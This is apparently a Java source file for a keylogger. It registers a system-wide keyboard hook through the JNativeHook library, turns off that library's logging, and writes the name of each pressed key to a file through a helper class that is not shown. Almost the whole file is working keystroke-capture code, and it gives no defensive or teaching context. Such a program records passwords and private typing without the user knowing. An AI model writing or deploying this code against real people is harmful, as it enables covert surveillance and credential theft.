package features;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;

public class KeyLogger implements NativeKeyListener {

    KeyLoggerFile kf = new KeyLoggerFile();

    public static void main(String args[]) {

        try {
            GlobalScreen.registerNativeHook();
            Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
            logger.setLevel(Level.OFF);
        } catch (NativeHookException e) {
            e.printStackTrace();
        }

        GlobalScreen.addNativeKeyListener(new KeyLogger());
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent key) {
        // throw new UnsupportedOperationException("Not supported yet.");r //To change
        // body of generated methods, choose Tools | Templates.

    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent key) {
        // throw new UnsupportedOperationException("Not supported yet."); //To change
        // body of generated methods, choose Tools | Templates.
        CharSequence text = NativeKeyEvent.getKeyText(key.getKeyCode()) + "\n";
        try {
            kf.keyLoggerWriter(text);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent key) {
        // throw new UnsupportedOperationException("Not supported yet."); //To change
        // body of generated methods, choose Tools | Templates.
        // System.out.println("Released : " + NativeKeyEvent.getKeyText(key.getKeyCode()));
    }
}

